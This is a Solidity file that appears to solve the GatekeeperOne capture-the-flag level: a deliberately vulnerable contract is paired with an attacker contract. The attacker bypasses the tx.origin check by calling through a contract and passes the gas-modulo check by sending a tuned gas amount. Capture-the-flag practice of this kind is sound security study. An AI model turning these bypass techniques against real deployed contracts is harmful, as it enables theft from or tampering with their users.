// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin); // use another contract to call the method
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract GatekeeperOne__Attacker {
    GatekeeperOne gateKeeperOne;

    constructor(address _gateKeeperOne) public {
        gateKeeperOne = GatekeeperOne(_gateKeeperOne);
    }

    function attackEnter(uint256 _offset, bytes8 _gateKey) public {
        gateKeeperOne.enter{gas: 8191 * 10 + _offset}(_gateKey);
    }
}